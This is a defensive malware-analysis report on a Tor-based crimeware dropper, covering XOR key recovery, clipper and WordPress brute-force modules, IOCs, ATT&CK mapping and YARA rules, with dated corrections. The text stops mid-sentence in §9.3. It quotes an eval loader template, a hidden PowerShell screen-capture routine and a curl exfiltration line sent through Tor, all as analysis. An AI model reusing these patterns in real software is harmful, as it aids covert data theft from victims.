# XORTOR — Analysis of a Tor-Based Modular Crimeware Platform

**Author:** Mustafa Emre
**Date:** 2026-07-18 (analysis) · 2026-07-22 (campaign update)
**TLP:** CLEAR

**Samples analysed:**

| # | SHA-256 |
|---|---|
| 1 | `448776210b0c1802fd3e5da66813e90e7469bcd365d64e11b2a992547bc2fd4a` |
| 2 | `149ab46739ca442762502a69f0960365a7c5e7761c76f2e6c2997bd43744a62a` |
| 3 | `78ef4cadec54dfda9055668975351cb20566d65be346536fa0f0eb7c8945203d` |

Sections 2-8 describe build 1 in full. Section 9 covers what changes across
all three builds.

> ## Revision notice — 2026-08-19
>
> This report was reviewed externally and **several claims did not survive**.
> All are corrected in place, marked *Correction — 2026-08-19*, with the
> original text left visible so the change is auditable.
>
> | Claim | Status |
> |---|---|
> | §7.4 false-positive fix "applied and re-tested" | **Was never applied.** Rule corrected; CI added |
> | `1988hhzEeH`, `12Qntcik` as `.onion` fragments | **Impossible** — fail RFC4648 base32. Reclassified |
> | "BIP-39 seed brute-forcing" | **Arithmetically indefensible** (2¹²¹). Rewritten as harvesting |
> | "Four obfuscation layers stripped" | **Two of four.** PyArmor and obfuscator.io were not |
> | "New SHA-256 roughly hourly" | **n=2 on an attacker-writable field.** Downgraded to low confidence |
> | "Byte-identical apart from icon" | **Contradicted in its own sentence** by three `.rsrc` sizes |
> | Four ATT&CK technique IDs | **Wrong or unsupported.** Corrected or removed |
> | `campus.py` "intentional corruption" | **Own pipeline not excluded** as the cause |
>
> The technical core holds. The XOR key recovery in §3.4–3.5 was independently
> checked and is internally consistent: key, `$mz_enc` and ciphertext agree.
>
> **The C2 addresses were never recovered**, and that remains the largest gap —
> §5 is honest about it while §1 and the README were not. Corrected.

---

## 1. Executive summary

A PyInstaller-packaged dropper delivers a modular crimeware platform that turns the victim host into a worker node for two independent monetisation schemes: a **WordPress brute-force botnet** and a **cryptocurrency clipper with BIP-39 seed-phrase harvesting and screen capture**. All command-and-control traffic is tunnelled through a **bundled Tor client** to two distinct `.onion` services.

The sample stacks four layers of obfuscation — a recompiled PyInstaller bootloader, a PyArmor-protected loader, a 12-byte repeating-XOR payload set, and `obfuscator.io`-processed JScript. **Two of the four were fully stripped**: the PyInstaller container was extracted, and the XOR payload set was decrypted **statically, without execution and without possession of the key**, through frequency analysis.

The other two were not. `installer.pyc` remains PyArmor-protected and unread (§3.3), so the orchestrator — how modules are launched, how tasking flows, where persistence is established — is unknown. The `obfuscator.io` string array was never decoded, which is why **the C2 addresses were never reassembled** (§5): the fragments below are 10-character chunks, not addresses. *(Corrected 2026-08-19; this paragraph previously implied all four layers fell.)*

The chain's critical weakness is its choice of repeating-XOR over authenticated encryption: the key leaks through the NUL-padded regions of the encrypted PE, making the payload detectable **on disk in its encrypted state** — and detectable without knowing the key at all.

Two further builds were analysed. The dropper is identical apart from its `.rsrc` section (three different sizes — see the wording correction in §9); the XOR key rotates every build while the payload does not. The builder's primary function is **hash rotation**, not payload development (§9). A sandbox run of build 2 returned almost nothing, because the sample checks its environment and exits (§10).

---

## 2. Sample information

Build 1 (see §9 for build 2 and 3 deltas).

| Field | Value |
|---|---|
| SHA-256 | `448776210b0c1802fd3e5da66813e90e7469bcd365d64e11b2a992547bc2fd4a` |
| Type | PE32+ executable (GUI) x86-64 |
| Size | 14,299,991 bytes |
| Code / Overlay | 299,520 bytes / 14,000,471 bytes (98% overlay) |
| Packer | PyInstaller 6.20.0 (bootloader recompiled from source) |
| Source | MalwareBazaar |

### Section entropy

| Section | Entropy | Size |
|---|---|---|
| `.text` | 6.47 | 181,760 |
| `.rdata` | 5.75 | 80,896 |
| `.data` | 1.82 | 3,584 |
| `.pdata` | 5.32 | 9,728 |
| `.fptable` | 0.00 | 512 |
| `.rsrc` | 7.91 | 19,968 |
| `.reloc` | 5.26 | 2,048 |

`.text` at 6.47 indicates unpacked, compiled code. The high `.rsrc` entropy initially suggested an embedded encrypted payload, but resource enumeration returned only `RT_ICON`, `RT_GROUP_ICON` and `RT_MANIFEST` — compressed icon data, not a payload. Hypothesis eliminated.

### Imports

The import table contains **no network, registry, cryptographic or injection APIs**. The only notable entry is `CreateProcessW`. Combined with `ShutdownBlockReasonCreate`, `DialogBoxIndirectParamW`, `MulDiv` and `SetDllDirectoryW`, the profile is that of an **installer, not a payload** — the real logic is elsewhere.

---

## 3. Analysis chain

### 3.1 Overlay discovery

Sections end at offset `299520`; the file is `14299991` bytes. **14,000,471 bytes of overlay** — 98% of the file sits outside the PE structure. Installers append their payload rather than embedding it in sections, which is consistent with the import profile.

### 3.2 Container identification

Overlay begins with `78 da` (zlib, default compression). Strings reveal:

```
PYINSTALLER_SUPPRESS_SPLASH_SCREEN
PYINSTALLER_STRICT_UNPACK_MODE
_pyinstaller_pyz
python313.dll
```

Container is **PyInstaller** (Python 3.13), not NSIS as the import profile first suggested. Extracted with `pyinstxtractor-ng`.

### 3.3 Extracted contents

```
campus.py                   <- base64 blob, no executable code
installer.pyc               <- PyArmor-protected orchestrator
pyarmor_runtime_000000/     <- pyarmor_runtime.pyd (640 KB)
data_p002/                  <- encrypted payload set
psutil, _wmi.pyd            <- process enumeration
libcrypto-3.dll             <- OpenSSL
```

`installer.pyc` (42,622 bytes) contains the `__pyarmor__` and `PY000000` markers followed by high-entropy data. Statically unreadable; bytecode decompilation is not viable.

### 3.4 Payload set: encryption identified

Every file in `data_p002/` returns `data` from `file(1)` — including `uusd.exe` at 9 MB, which should begin with `MZ`. The entire set is encrypted.

| File | Entropy | Size |
|---|---|---|
| `uusd.exe` | 7.53 | 8,984,064 |
| `002a.txt` | 6.74 | 1,519,563 |
| `002_n.js` | 6.86 | 28,639 |
| `002_b.js` | 6.86 | 25,295 |
| `002w.txt` | 6.41 | 15,162 |
| `002.xml` | 5.44 | 3,496 |
| `pack.js` | 6.80 | 2,717 |

Entropy of 7.53 rules out AES (which would approach 7.99). Byte frequency analysis of `uusd.exe`:

```
0x35 ('5'): 208161    0x78 ('x'): 207716    0x69 ('i'): 200045
0x79 ('y'): 187803    0x49 ('I'): 175542
```

All top bytes are printable ASCII, with no single byte dominating (max ~2.3%). This rules out single-byte XOR. Combined with visible repeating patterns in the ciphertext (`5aIYxkkqiTgN5aIYxwkig5`), the encryption is **repeating-key XOR**.

### 3.5 Key recovery (no key material required)

**Step 1 — key length via normalised Hamming distance:**

```
keylen= 36  score=1.575
keylen= 24  score=1.614
keylen= 12  score=1.618
keylen=  3  score=3.053
```

36 and 24 are multiples of 12. **Key length = 12.**

**Step 2 — key bytes via column frequency.** A PE contains more NUL bytes than any other value. Since `NUL XOR k == k`, the most frequent ciphertext byte in each key-position column is the key byte itself:

```python
key = bytearray()
for i in range(12):
    col = data[i::12]
    freq = [0] * 256
    for b in col:
        freq[b] += 1
    key.append(max(range(256), key=lambda x: freq[x]))
```

**Recovered key: `tgn5AIyxKkQi`** (`74 67 6e 35 41 49 79 78 4b 6b 51 69`)

**Step 3 — verification:** decrypting the first bytes of `uusd.exe` yields `4d 5a` (`MZ`) with a valid DOS header and PE pointer at offset `0x3c`. All seven files decrypt to valid formats:

| File | Decrypted magic | Identified as |
|---|---|---|
| `uusd.exe` | `MZx\x00` | PE32+ console x86-64 |
| `002.xml` | `\xff\xfe<\x00` | UTF-16LE XML |
| `002_n.js` / `002_b.js` | `var ` | JScript |
| `pack.js` | `func` | JScript |
| `002w.txt` | `aban` | BIP-39 wordlist |
| `002a.txt` | `\xef\xbb\xbf1` | UTF-8 BOM + BTC addresses |

Total elapsed time from first hypothesis to full decryption: approximately 20 minutes.

---

## 4. Capabilities

### 4.1 `uusd.exe` — bundled Tor client

Strings include `EntryNodes`, `HiddenServiceNodes`, `RendNode`, `.onion checksum`, `Rend stream is %d seconds late`, `Closed %u streams for service %s.onion`. This is a **Tor daemon**, not a payload.

> **Correction of an early hypothesis.** `SHA256` and `ECDSA` matches in this binary initially suggested wallet-derivation code. On inspection, every match belongs to OpenSSL's TLS cipher suite tables (`ECDHE-ECDSA-AES128-GCM-SHA256`). There is no `secp256k1`, no `bip39`, no `mnemonic`. The binary provides anonymity, nothing else.

The absence of any version information (no `CompanyName`, `ProductName`, `OriginalFilename`) in a 9 MB binary is itself anomalous and weakens a "repackaged legitimate software" reading.

### 4.2 `pack.js` — packer template

Not operational code. A build-time template:

```javascript
var _bdata = '%D%', _passw = '%P%';
try { eval(_decryptContent(_base64Decode(_bdata), _passw)); } catch (e) {}
```

`%D%` and `%P%` are placeholders substituted at build time. The pattern — **base64 → XOR → eval** — mirrors the outer layer, confirming a reusable builder rather than a one-off sample.

### 4.3 `002_b.js` — WordPress brute-force module

| Constant | Value |
|---|---|
| `BRUTE_MAX_THREADS` | `0x28` (40) |
| `CHECK_MAX_THREADS` | `0x14` (20) |
| `BRUTE_DPWD_COUNT` | `0x3c` (60) |
| `BRUTE_MAX_ERRORS` | `0xa` (10) |
| `STOR_MAX` | `0x1f4` (500) |

- **`WPGetUsers`** + `/wp-json/w` — user enumeration via the WordPress REST API
- `<methodName>`, `<member>`, `<name>mt_k`, `<boolean>`, `<string>` — **XML-RPC `system.multicall`**, the standard amplification technique for WordPress brute-forcing (hundreds of credential attempts per request). This explains `002.xml`: a multicall template.
- `GetUserAgent()` — randomised User-Agent generation across Chrome/Firefox/Opera/Safari with randomised version numbers
- C2: `sqwzutzq7b` + `3ad.onion/`

### 4.4 `002_n.js` — crypto clipper, seed-phrase harvesting, screen capture

**Clipboard hijacking.** Five address families are maintained:

```javascript
btc_1_addrs   // BTC P2PKH (legacy, "1...")
btc_3_addrs   // BTC P2SH ("3...")
btc_q_addrs   // BTC Bech32 ("bc1q...")
trn_addrs     // TRON
mony_addrs    // Monero
```

with `LoadREPL()`, `replace`, and `idx_*` index objects. `002a.txt` (39,998 addresses) is the attacker-controlled substitution pool.

**BIP-39 wordlist handling.** `LoadBip39()` reads `002w.txt` — the canonical
**BIP-39 English wordlist** (2048 words, beginning `abandon`, `ability`,
`able`).

> **Correction — 2026-08-19.** This was previously written as *"seed
> brute-forcing"*, and that claim propagated into the executive summary, the
> ATT&CK table and the README. **It is arithmetically indefensible.** A 12-word
> BIP-39 mnemonic has a search space of 2048¹¹ ≈ 2¹²¹ (the final word is
> checksum-constrained). Brute-forcing that on a victim workstation, in JScript,
> under Windows Script Host, is not slow — it is impossible by many orders of
> magnitude.
>
> The evidence was only ever two things: a function named `LoadBip39()` and the
> presence of the wordlist. Neither establishes brute-forcing. The far more
> likely purpose is **recognition**: matching clipboard or screen text against
> the wordlist to identify a seed phrase and exfiltrate it. That reading is
> consistent with the clipboard monitoring, the screen capture and `LoadREPL()`
> already documented here.
>
> So the underlying finding — **seed phrase harvesting** — is probably correct.
> The mechanism was named wrongly, and the wrong name was carried into four
> other places in this repository. **Not resolved by re-reading the code**: the
> decompiled JScript around `LoadBip39` and `BIP39_PATH` has not been
> re-examined. If it only ever calls `indexOf` against the list, harvesting is
> confirmed. If it generates combinations — e.g. completing a partially
> recovered phrase — then a bounded brute-force is plausible and the word count
> assumed must be stated.

**Screen capture** via hidden PowerShell:

```powershell
Add-Type -AssemblyName System.Windows.Forms
$sw = [System.Windows.Forms.SystemInformation]::VirtualScreen
$bmp = New-Object System.Drawing.Bitmap(...)
$g.CopyFromScreen(0, 0, 0, 0, ...)
$bmp.Save('%TEMP%\screenshot_...')
```

executed with `-WindowStyle Hidden`.

**Process monitoring** via WMI: `winmgmts:{impersonationLevel=impersonate}\\.\root\CIMV2`, `SELECT * FROM Win32_Process WHERE ...`.

C2: `ffeasxsfee` + `xev2rvxfiv` + `i2wvkxre5v` + `axkjeepxzx` + `va4u4ydm2q` + `ead.onion/`

### 4.5 Exfiltration

All outbound traffic is proxied through the bundled Tor client:

```
curl -X POST -d "<data>" --socks5 localhost:9050 --max-time 30 -o <output>
```

with `&NAME=` and `&GUID=` parameters identifying the bot. Bot identity is generated by `createGUID()` and persisted to `GUID_PATH`.

### 4.6 Host artefacts

| Artefact | Purpose |
|---|---|
| `GUID_PATH` | Bot identifier |
| `PUSH_FILE` | Task queue |
| `STOR_FILE` | Result store (capped at 500 entries) |
| `GOOD_PATH` | Successful hits |
| `GEOIP_PATH` | GeoIP data |
| `BIP39_PATH` | Wordlist path |
| `%TEMP%\screenshot_*` | Captured screenshots |

Execution occurs through Windows Script Host: `ActiveXObject`, `WScript.Shell`, `Scripting.FileSystemObject`.

---

## 5. Indicators of compromise

### Network

C2 addresses are split into 10-character chunks inside the obfuscator string
array and concatenated at runtime. The fragments below are what was recovered;
**none reassembles to a complete 56-character v3 onion address**, so treat
these as partial indicators rather than resolvable hosts.

> **Correction — 2026-08-19.** Two strings previously listed here as C2
> fragments, `1988hhzEeH` and `12Qntcik`, **cannot be part of an onion
> address**. A v3 address is RFC4648 base32 — only `a-z` and `2-7`. The first
> contains `1`, `8` and `9`; the second contains `1`. Every other fragment
> listed here validates against that alphabet, so a single check would have
> caught it. Their real purpose is unknown; candidates include a bot
> identifier, an auth token or a base64 fragment. Moved to
> `XORTOR_Unclassified_Strings` in the ruleset and recorded below under
> *Unclassified*.

```
Module B (WordPress) - all three builds:
  sqwzutzq7b [...] 3ad.onion          (13 of 56 chars recovered)
  additional fragment:  yxoedle2gd

Module N (clipper) - build 1:
  ffeasxsfee xev2rvxfiv i2wvkxre5v axkjeepxzx va4u4ydm2q ead.onion
  (53 of 56 chars recovered - incomplete)

Module N (clipper) - builds 2 and 3:
  http://hek [...] x47vp3k7pg ffeasxsfee [...]
  gate path: core/repla[...].php

Unclassified - recovered, purpose undetermined, NOT onion fragments:
  1988hhzEeH   12Qntcik            (fail RFC4648 base32; see correction above)

Local:
  127.0.0.1:9050                      (Tor SOCKS proxy)
```

The `ffeasxsfee` fragment appears in every build. It is the single most
durable network indicator observed.

### Cryptographic

XOR keys rotate every build (see §9):

```
build 1   tgn5AIyxKkQi   (74 67 6e 35 41 49 79 78 4b 6b 51 69)
build 2   9famr2xoY773
build 3   K6ngtB2dEud6
```

All are 12 bytes of mixed-case alphanumerics; no pattern links them.
Key values are therefore unsuitable as standalone indicators.

### Wallet fragments

```
build 1   jZh3AMaxrk, Ws9hfanP5h, i1ir3EUU85, 32ozR62LxL, ox4tsxfxqw
builds 2-3   12FfZsjyDr, bc1qz33n9x, rvCKiLmRnr, aACxfnXrKP, NheW, 5c82
```

Address families targeted: BTC P2PKH, BTC P2SH, BTC Bech32, TRON, Monero.

### Files

```
SHA-256   448776210b0c1802fd3e5da66813e90e7469bcd365d64e11b2a992547bc2fd4a  (build 1)
          149ab46739ca442762502a69f0960365a7c5e7761c76f2e6c2997bd43744a62a  (build 2)
          78ef4cadec54dfda9055668975351cb20566d65be346536fa0f0eb7c8945203d  (build 3)

Decrypted payload hashes (stable across builds where noted):
          c49dc64559ca84df2716113592b84ada7704e783a3e31b3ab42b531cc835e996  002_b.js (all builds)
          a4ac942e07c0ce7e9982a8594ca5a5354f1389acae995b112f4424843579b6cc  002_n.js (builds 2-3)

Bundled   campus.py, installer.pyc, uusd.exe, data_p002/,
          002_b.js, 002_n.js, pack.js, 002.xml, 002a.txt, 002w.txt
Runtime   pyarmor_runtime_000000/pyarmor_runtime.pyd
Dropped   %TEMP%\screenshot_*
```

Dropper hashes are **not useful for detection** - a fresh one appears roughly
hourly (§9). The decrypted payload hashes are stable and far more valuable.

### Behavioural

- `curl` invoked with `--socks5 localhost:9050` from a script host process
- `powershell -WindowStyle Hidden` performing `CopyFromScreen`
- WSH process issuing `POST` requests to `.onion` addresses
- XML-RPC `system.multicall` requests against external WordPress hosts
- `/wp-json/wp/v2/users` enumeration from a workstation

---

## 6. MITRE ATT&CK mapping

| Tactic | Technique | Evidence |
|---|---|---|
| Defense Evasion | T1027 — Obfuscated Files or Information | Four stacked layers |
| Defense Evasion | T1027.002 — Software Packing | PyInstaller + custom bootloader |
| Defense Evasion | T1140 — Deobfuscate/Decode Files | base64 → XOR → eval |
| Execution | T1059.001 — PowerShell | Hidden screen capture |
| Execution | T1059.007 — JavaScript | JScript modules via WSH |
| Execution | T1047 — Windows Management Instrumentation | `Win32_Process` enumeration |
| Discovery | T1057 — Process Discovery | `psutil`, `_wmi.pyd`, WMI queries |
| Collection | T1113 — Screen Capture | `CopyFromScreen` → `%TEMP%` |
| Collection | T1115 — Clipboard Data | Five-family address substitution |
| Credential Access | T1110.001 — Password Guessing | XML-RPC multicall, 60 passwords per enumerated user. **Corrected 2026-08-19** from T1110.003 (Spraying): spraying is many accounts / few passwords; this enumerates users via `WPGetUsers` then tries `BRUTE_DPWD_COUNT`=60 each. Targets third parties, not the victim host. |
| Command and Control | T1090.003 — Multi-hop Proxy | Bundled Tor, dual `.onion` C2 |
| ~~T1573 — Encrypted Channel~~ | **Removed 2026-08-19.** Evidence was "Tor + XOR-obfuscated config". Tor is already counted under T1090.003, and an XOR-obfuscated config on disk is T1027, not an encrypted C2 channel. No independent evidence supported this row. |
| Resource Development | T1584.005 — Compromise Infrastructure: Botnet | **Corrected 2026-08-19.** T1583.003 is Virtual Private Server, not Botnet — the ID was simply wrong. The operator builds a botnet from compromised hosts (T1584.005) rather than renting one (T1583.005). PRE-platform, adversary-side, inferred — not observable from a sample. |
| Impact | T1657 — Financial Theft | Clipper + seed-phrase harvesting |

Added from dynamic analysis (§10):

| Tactic | Technique | Evidence |
|---|---|---|
| Defense Evasion | T1562.001 — Disable or Modify Tools | Windows Defender modification via PowerShell |
| Defense Evasion | T1497.003 — Time Based Evasion | Kill-date check; exits early after reading local time. **Corrected 2026-08-19** from the parent T1497 — a time check has a specific sub-technique. |
| Defense Evasion | T1070.004 — File Deletion | Anomalous deletion behaviour (10+ files) |
| Discovery | T1614 — System Location Discovery | Locale query, consistent with geofencing |
| Discovery | T1082 — System Information Discovery | Volume serial / hardware ID fingerprinting |

---

## 7. Detection opportunities

### 7.1 Static (see `xortor.yar`)

| Rule | Target | Layer |
|---|---|---|
| `XORTOR_XORed_PE_KeyAgnostic` | XOR-encrypted PE, **any key** | **On-disk, pre-decryption** |
| `XORTOR_Encrypted_Payload` | Encrypted PE, build-1 key only | On-disk (superseded) |
| `XORTOR_Dropper_PyInstaller_PyArmor` | Dropper | On-disk |
| `XORTOR_JS_Modules_Decrypted` | JScript modules | Memory / post-decryption |
| `XORTOR_C2_Onion_Fragments` | C2 fragments (base32-validated) | Memory / post-decryption |
| `XORTOR_Unclassified_Strings` | Two strings previously mislabelled as C2 fragments; purpose unknown | Not for production |
| `XORTOR_Screenshot_Capture` | PowerShell capture routine (renamed 2026-08-19 — capture to `%TEMP%` was evidenced, upload was not) | Memory / post-decryption |

**The key insight behind `XORTOR_Encrypted_Payload`:** PE headers are NUL-heavy, and `NUL XOR key == key`. The key therefore appears **in cleartext inside the ciphertext**, at an arbitrary rotation. Matching all twelve rotations detects the payload on disk without decryption — the encryption defeats itself.

**Why `XORTOR_XORed_PE_KeyAgnostic` supersedes it.** The rule above still names a specific key, so it dies on the next build. The same property can be expressed without any key material at all. The plaintext PE header begins `4D 5A 78 00 01 00 00 00 04 00 00 00` followed by NUL padding, so with a 12-byte key, ciphertext bytes 12-15 encrypt NULs and equal the key. XORing them against bytes 0-3 recovers the plaintext regardless of key value:

```
uint8(0) ^ uint8(12) == 0x4D    (M)
uint8(1) ^ uint8(13) == 0x5A    (Z)
uint8(2) ^ uint8(14) == 0x78
uint8(3) ^ uint8(15) == 0x00
```

A `uint16(0) != 0x5A4D` guard is required, otherwise the condition holds for every plaintext PE — bytes 12-15 of a normal PE are already NUL, so XORing changes nothing. Without that guard the rule fires on every Windows executable on the system. This was caught in testing, not in review.

### 7.2 Behavioural (higher-value, campaign-independent)

These survive rebuilds; the static indicators do not.

1. **`curl --socks5 localhost:9050` spawned by `wscript.exe`/`cscript.exe`** — very low legitimate baseline on a workstation
2. **A script host process issuing outbound requests to `.onion` addresses**
3. **`powershell -WindowStyle Hidden` invoking `CopyFromScreen`**
4. **A workstation issuing XML-RPC `system.multicall` to external hosts** — a workstation has no business brute-forcing WordPress
5. **A local Tor listener on 9050 not attributable to a known Tor Browser installation**
6. **Clipboard write immediately following a clipboard read containing a cryptocurrency address pattern**

### 7.3 Known limitations

- **`XORTOR_Encrypted_Payload` only fires on the encrypted PE.** Verified: it matches `uusd.exe` but not the encrypted `002_b.js`, `002_n.js`, `002.xml`, `002a.txt`, `002w.txt`. Key leakage requires **12 consecutive NUL bytes**. Plaintext files have none; `002.xml` is UTF-16 with alternating NULs, which never produces a 12-byte run. The rule's true scope is "XOR-encrypted PE", not "XOR-encrypted file".
- **JScript rules fire on decrypted content only.** These files never touch disk in cleartext. Effective for memory scanning (`yara -p`) or EDR in-memory rules; ineffective for on-disk scanning.
- **String-based rules are brittle.** Rebuilding with a new XOR key defeats `XORTOR_Encrypted_Payload`; rotating C2 defeats `XORTOR_C2_Onion_Fragments`. The behavioural detections in 7.2 carry the durable value.
  **Confirmed in practice.** Build 2 used a different key and `XORTOR_Encrypted_Payload` produced no match, exactly as predicted. `XORTOR_XORed_PE_KeyAgnostic` was written in response and matched all three builds under three distinct keys.
- **`XORTOR_C2_Onion_Fragments` is on borrowed time.** It survives builds 1-3 because the `ffeasxsfee` fragment was reused, but the clipper C2 and wallet set already changed once between builds 1 and 2. Expect this rule to degrade.

### 7.4 False positives observed and resolved

`XORTOR_Screenshot_Exfil` (now `XORTOR_Screenshot_Capture`) initially matched `/Applications/Duolingo English Test.app/Contents/Resources/app.asar`.

**Root cause:** the rule keyed on generic PowerShell API strings (`Add-Type -`, `Windows.Fo`, `awing.Bitm`, `$bmp.Save(`). Legitimate applications capture screens. Within a multi-megabyte Electron bundle, four generic fragments co-occur by chance, and the `4 of ($ps*)` threshold was too permissive.

**Resolution:** added `filesize < 200KB` and required at least one campaign anchor (`--socks5`, `.onion/`, `PingToOnion`, `createGUID`, `&GUID=`, `mony_addrs`).

**Re-test:** `002_n.js` still matches; the Duolingo bundle no longer does. No matches across `/usr/bin`.

> ### Correction — 2026-08-19
>
> **The resolution described above was never applied to the shipped rule.** An
> external review compared this section against `yara/xortor.yar` and found the
> rule's condition was still:
>
> ```yara
> condition:
>     4 of ($ps*)
>     or ($art and 2 of ($ps*))
> ```
>
> No `filesize` bound. None of the six campaign anchors. And the second branch
> was *looser* than the one blamed for the false positive. Reproduced: a
> four-line benign PowerShell screenshot snippet matched it.
>
> This is worse than a defective rule. **The report asserted a verification that
> did not happen**, which puts every other "verified", "confirmed" and
> "re-tested" claim in this document in question — and there are several.
>
> Two further defects were found in the same review and are corrected in the
> ruleset (see the revision header of `yara/xortor.yar`):
>
> - Four rules matched `xortor.yar` itself and three matched this report. Any
>   MISP export or blog post quoting these IOCs would have alerted. All rules
>   now carry file-type and size guards.
> - `$o3b` and `$o3c` were labelled `.onion` C2 fragments. They cannot be — v3
>   onion addresses are RFC4648 base32 (`a-z`, `2-7`) and these contain `1`,
>   `8` and `9`. Verified programmatically; every other fragment validates.
>   Moved to `XORTOR_Unclassified_Strings` and reclassified in §5.
>
> **The corrected rules have not been re-tested against the original samples**,
> which were unavailable at revision time. The three changes are verifiable by
> inspection and by the CI job that now scans this repository with its own
> rules. Anyone holding the samples should re-run the positive controls.
>
> A CI workflow (`.github/workflows/validate-rules.yml`) now asserts that no
> rule matches repository content. That single check would have failed on the
> commit which introduced this discrepancy.

---

## 8. Dead ends and undetermined

Recorded for completeness; negative results are results.

### 8.0 Not determined — added 2026-08-19

The original §8 covered only `campus.py`. External review noted that several
questions an IR team asks first were **neither answered nor flagged as open**,
which is worse than answering them badly. They are recorded here.

**Persistence mechanism: unknown.** The ATT&CK table in §6 contains no
Persistence row at all — not because none exists, but because none was found.
For a report describing a long-running botnet worker, that is a conspicuous
hole. Root cause: the orchestrator (`installer.pyc`) is PyArmor-protected and
was never analysed (§3.3), so how modules are launched and where persistence is
installed is simply unobserved.

**Initial access vector: not investigated.** How the dropper reaches a victim —
phishing, SEO poisoning, cracked-software bundling — was never examined. No
delivery context was collected from MalwareBazaar.

**Privilege escalation: not investigated.**

**Exfiltration destination and volume: not characterised.** §4.5 shows the
`curl --socks5` pattern; what is actually sent, and to which `.onion` path, was
not determined because the C2 addresses were never reassembled.

Closing these needs the orchestrator. Two viable routes: dump
`pyarmor_runtime.pyd` at runtime on an x86 VM, or use the CAPE report's process
tree, registry and autoruns diff (§10) — empty for build 2 because the sample
exits on its kill-date check, but re-runnable with the date bypassed.

**`campus.py` could not be extracted.** The file contains a single base64 blob decoding to UTF-8 mojibake with a visible RAR5 signature (`Rar!\x1a\x07\x01`). Character-by-character re-encoding through cp1252 with latin-1 fallback produced a 247,209-byte output — but the eighth byte was `0x20` instead of the required `0x00`, and 7-Zip rejected the archive.

Diagnosis via byte counting:

```
LEN   : 247209
0x00  : 0
0x20  : 1898
```

**Zero NUL bytes in a 247 KB binary is statistically impossible.** Every NUL was lost in transit — partially converted to `0x20`, partially dropped. The data is irrecoverably lossy; no encoding recovers it.

Three readings, unresolved:

1. **Intentional corruption.** The blob may be designed to resist naive `base64.b64decode()` extraction, with the PyArmor-protected loader restoring NULs at runtime through a method not recoverable statically.
2. **Transit damage.** The blob may have been corrupted through an encode/decode chain during packaging or distribution.
3. **My own extraction was lossy.** — *added 2026-08-19, and the most likely of the three.*

> **Correction — 2026-08-19.** The original text offered only readings 1 and 2
> and drew an adversary capability from them: *"the PyArmor-protected loader
> restoring NULs at runtime through a method not recoverable statically."*
> **That inference is not supported.**
>
> The described method — *"character-by-character re-encoding through cp1252
> with latin-1 fallback"* — means the base64 blob was handled as `str` at some
> point. Reading binary data in text mode and re-encoding it destroys NUL bytes
> and converts some to `0x20`. **That is precisely the signature observed:**
> zero NULs in 247 KB, and 1,898 occurrences of `0x20`. The evidence fits a bug
> in my own tooling at least as well as it fits attacker design, and the
> "statistically impossible" framing concealed that a third explanation existed.
>
> Resolve it before claiming anything: read with `open(path, 'rb')`, extract the
> base64 alphabet with a byte-level regex, and run
> `base64.b64decode(data, validate=True)`. If NULs appear, delete readings 1 and
> 2. If they do not, report the blob's exact file offset and first 64 bytes so
> the claim rests on evidence rather than on an absence produced by my own
> pipeline.

The archive's string table nonetheless revealed its contents: `pyinstaller-6.20.0/bootloader/build/release/run.exe`, `runw.exe`, and the full set of `.o` build artefacts — **a recompiled PyInstaller bootloader**. Stock bootloader signatures are catalogued by every AV vendor; recompiling from source invalidates them. This finding survived the failed extraction and is arguably the more important one.

---

## 9. Campaign evolution

Three builds analysed:

| # | SHA-256 | Compiled (TimeDateStamp) |
|---|---|---|
| 1 | `448776210b0c1802fd3e5da66813e90e7469bcd365d64e11b2a992547bc2fd4a` | — |
| 2 | `149ab46739ca442762502a69f0960365a7c5e7761c76f2e6c2997bd43744a62a` | `0x6a611c70` |
| 3 | `78ef4cadec54dfda9055668975351cb20566d65be346536fa0f0eb7c8945203d` | `0x6a612aac` |

Builds 2 and 3 carry `TimeDateStamp` values **3,644 seconds apart — roughly one
hour**.

> **Correction — 2026-08-19.** This was previously presented as evidence of an
> hourly build cadence and of "automated output". **Neither conclusion is
> supported.** Three problems: (a) `n = 2`, and build 1's timestamp is absent
> from the table with no explanation; (b) `TimeDateStamp` is attacker-writable,
> and in PyInstaller output it reflects the *bootloader's* compile time, not
> when the sample was packaged; (c) all three came from MalwareBazaar, so
> upload timing is a biased sample of build timing.
>
> What can be said: **two builds carry timestamps one hour apart. The campaign's
> build cadence is unknown (low confidence).** The downstream conclusion — that
> hash-based detection is worthless here — is probably right, but it rests on
> the payload being identical across builds (§9.2), not on this timing. To
> establish cadence properly, collect `first_seen` across many samples from
> MalwareBazaar/VT and report the distribution.

The dropper is identical across all three **apart from its `.rsrc` section**
(19,968 / 18,432 / 19,456 bytes). Every other section matches in size and
entropy, and all three carry the same 150 imports.

> **Wording correction — 2026-08-19.** "Byte-identical apart from its icon" was
> wrong: three different `.rsrc` sizes are given in the same sentence, so the
> files are demonstrably not byte-identical. The "same 150 imports" claim should
> also be evidenced with an imphash rather than a count — 150 imports is not the
> same as 150 *identical* imports.

### 9.1 What rotates, what does not

| Element | Build 1 | Build 2 | Build 3 | Status |
|---|---|---|---|---|
| XOR key | `tgn5AIyxKkQi` | `9famr2xoY773` | `K6ngtB2dEud6` | **rotates every build** |
| `002_b.js` (WordPress) | `c49dc645…` | `c49dc645…` | `c49dc645…` | **never touched** |
| WordPress C2 | `sqwzutzq7b`+`3ad.onion/` | same | same | **static** |
| BIP-39 list / 40k addresses | `002w.txt` / `002a.txt` | identical | identical | **static** |
| `002_n.js` (clipper) | v1 | v2 | **v2, byte-identical to build 2** | updated once |
| Clipper wallets | `jZh3AMaxrk`… | `12FfZsjyDr`, `bc1qz33n9x`, `rvCKiLmRnr`, `aACxfnXrKP` | same as build 2 | updated once |
| Clipper C2 | `ffeasxsfee`… | `http://hek`+`x47vp3k7pg`+`ffeasxsfee` | same as build 2 | partially reused |

### 9.2 Assessment

Between builds 2 and 3 **nothing changed but the XOR key**. The decrypted
payload set is byte-for-byte identical; only the encryption differs, and with
it the file hash.

The builder's primary function is therefore not payload development but
**hash rotation**: repackaging an unchanged payload under a fresh random key
to defeat signature-based detection. Keys are 12 bytes of mixed-case
alphanumerics with no discernible pattern, consistent with random generation.

The WordPress module has not been modified across any build. The clipper was
updated once — new wallet addresses and a new C2 gate — while the
`ffeasxsfee` fragment persisted, indicating only partial infrastructure
rotation.

### 9.3 Detection impact

Hash-based detection is worthless against this campaign — not because of any
measured cadence (see the correction in §9), but because **the decrypted payload
set is byte-for-byte identical across builds while every dropper hash differs**
(§9.2). Re-encrypting unchanged content under a fresh key produces a new
SHA-256 for the same malware, at whatever rate the operator chooses.

`XORTOR_Encrypted_Payload`, which keyed on the literal key string, failed
